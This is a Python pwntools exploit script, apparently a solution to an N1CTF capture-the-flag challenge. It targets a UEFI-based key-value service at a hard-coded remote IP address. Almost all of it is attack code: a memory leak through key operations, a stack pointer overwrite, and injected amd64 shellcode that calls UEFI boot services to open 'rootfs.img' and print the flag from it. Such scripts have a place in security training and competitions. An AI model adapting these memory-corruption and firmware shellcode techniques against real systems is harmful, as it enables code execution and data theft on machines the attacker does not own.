from pwn import *
import random
from gmpy2 import mpz
context.bits = 64
context.arch = "amd64"

mapping = {
    0x1f757d3c:0x5fab24,
    0x1275213c:0x300724,
    0x1fe52860:0x700324
}

a = open("log", "r").read()
for i in a.split("\n"):
    if "MAPPING" in i:
        temp = eval(i.strip())
        print(hex(int(temp[1], 16)), hex(int(temp[2], 16)))
        mapping[int(temp[1], 16)] = int(temp[2], 16)

# r = process("python run.py".split())
# r = process("./start.sh")

r = remote("47.243.105.43", 9999)
a = r.recvline().strip().decode()
exp = int(a.split()[1].split('^')[-1][:-1])
mod = int(a.split()[3])
print(exp, mod)

ans = pow(mpz(2), pow(mpz(2), mpz(exp)), mpz(mod))
r.sendline(str(ans))
r.recvline()

for i in range(100):
    r.send("\x1b") # ESC

def rec():
    return r.recvuntil("> \n")

r.recvuntil("> \n", timeout=20)

def set_var(key, value):
    r.sendline("1")
    r.recvuntil("Key name:")
    if len(key) == 0x10:
        r.send(key)
    else:
        r.sendline(key)

    r.recvuntil("Key value:")
    if len(value) == 0x100:
        r.send(value)
    else:
        r.sendline(value)
    rec()

def del_var(key):
    r.sendline("2")
    r.recvuntil("Key name:")
    if len(key) == 0x10:
        r.send(key)
    else:
        r.sendline(key)
    rec()

def get_var(key):
    r.sendline("3")
    r.recvuntil("Key name:")
    if len(key) == 0x10:
        r.send(key)
    else:
        r.sendline(key)
    r.recvuntil("Value: \n")
    return rec()

def encode(key):
    r.sendline("4")
    r.recvuntil("Key name:")
    if len(key) == 0x10:
        r.send(key)
    else:
        r.sendline(key)

shellcode = """
mov rax, [rsp + 0x48]
xor edx, edx
mov dx, 0x19f6
sub rax, rdx
xor rcx, rcx
mov [rcx], rax
mov cl, 0x8
mov dx, 0x0000000000001AAF
add rax, rdx
mov [rcx], rax
mov rdi, rcx
mov esp, {stack_minus_320}
mov ebp, {stack_minus_310}
call rax

xor rcx, rcx
mov rax, [rcx]
mov dx, 0x19fc
add rax, rdx
mov edi, {stack}
xor esi, esi
add esi, 0x50
add esi, 0x50
add esi, 0x50
add esi, 0x50
add esi, 0x50
add esi, 0x50
add esi, 0x50
add esi, 0x50
add esi, 0x50
push rdi
jmp rax
"""

set_var("A", "D"*0x10)
del_var("N1CTF_KEY1")

encode("A")
leak = get_var("A")

print(leak.encode("hex"))
leak = u32(leak.split("DDDD")[0][-4:]) ^ 0x44444444
print("LEAK", hex(leak))
# stack = leak + (random.randint(0, 8) << 20) + 0x724
if leak not in mapping:
    print("FAIL not in map")
    if leak & 0xff == 0x60:
        mapping[leak] = -0x100
    else:
        mapping[leak] = 0x700324
stack = mapping[leak] + leak
print(hex(stack))

shellcode = shellcode.format(stack=hex(stack), stack_minus_320=hex(stack - 0x320), stack_minus_310=hex(stack - 0x310))
shellcode = asm(shellcode)
assert "\x00" not in shellcode
assert "\n" not in shellcode
assert chr(13) not in shellcode

set_var("N1CTF_KEY2", "B"*0x18 + p64(stack))
set_var("N1CTF_KEY3", "C"*0xff)
set_var("A", "D"*0x10 + shellcode)
set_var("N1CTF_KEY1", "A"*0xff)

pause()
encode("A")

data = r.recvuntil("\\xaf", timeout=10)
if "\\xaf" not in data:
    print("FAIL")
    r.close()
    exit()
leak = "\\xaf" + r.recvline()[:-1]
leak = u32(eval('"{}"'.format(leak)))
base = leak - 0x1aaf
print("SICE?")
print(hex(base))

# 0x000AF2248
# 0x01E17AE7C
# 0x01E302EB0
ImageHandle = 0x1e9a9598 - 0x1e152000 + base
SystemTable = 0x1f9ee018 - 0x1e152000 + base
ProtocolGuid = 0x01E181270 - 0x1e152000 + base

SimpleFile  = base + 0x110 # Any rw address should work
Root        = SimpleFile + 0x100
File        = Root + 0x80
Path        = File + (0x310 - 0x290)
puts        = base + 0x1aaf

sc = """
// rbp = SystemTable->BootService
mov rax, {pSystemTable}
mov rbp, [rax + 0x60]

// LocateProtocol(...);
mov r8d, {pSimpleFile}
mov ecx, {pProtocolGuid}
xor edx, edx
xor eax, eax
mov ax, 0x140
add rax, rbp
call [rax]

// SimpleFile->OpenVolume(SimpleFile, &Root)
mov rbp, [r8]
mov rax, [rbp+8]
mov edx, {pRoot}
mov rcx, rbp
call rax

// Root->Open(Root, &File, "path", EFI_FILE_MODE_READ ,EFI_FILE_READ_ONLY);
mov r8d, {pRoot}
mov rbp, [r8]
xor r9d, r9d
mov r10d, r9d
inc r9d
mov edx, {pFile}
mov [rdx], r10
inc r10d
mov rcx, rbp
mov r8d, {pPath}
"""

path = b'rootfs.img\0'
utf16_path = b''
for c in path:
    utf16_path += c + "\x00"
for i in range(0, len(utf16_path), 8):
    b = utf16_path[i:i+8]
    b += b'\0' * (8 - len(b))
    if i == 0:
        sc += """
        mov rbx, {}
        not rbx
        mov [r8], rbx
        """.format(hex(0xffffffffffffffff ^ u64(b)))
    else:
        sc += """
        mov rbx, {}
        not rbx
        mov [r8+{}], rbx
        """.format(hex(0xffffffffffffffff ^ u64(b)), i)

sc += """
mov rax, [rbp+8]
call rax
// file->Read(file, &size, buf)
mov r8d, {pFile}
mov rbp, [r8]
xor r8d, r8d
xor edx, edx
mov edx, 0x0101ffff
mov [rsp], rdx
mov rdx, rsp
mov rcx, rbp
mov rax, [rbp+0x20]
call rax
// find flag
mov rbx, 0x7463316e
xor edi, edi
lp:
mov eax, [rdi]
cmp rax, rbx
jz found
inc edi
jmp lp
found:
mov rcx, rdi
mov eax, {puts}
call rax
mov rcx, rdi
inc rcx
mov eax, {puts}
call rax

test:
jmp test
"""

sc = asm(sc.format(pSystemTable=SystemTable, pSimpleFile=SimpleFile, pProtocolGuid=ProtocolGuid, pRoot=Root, pFile=File, puts=puts, pPath=Path))
assert "\x00" not in sc 

r.sendline(sc)


r.interactive()

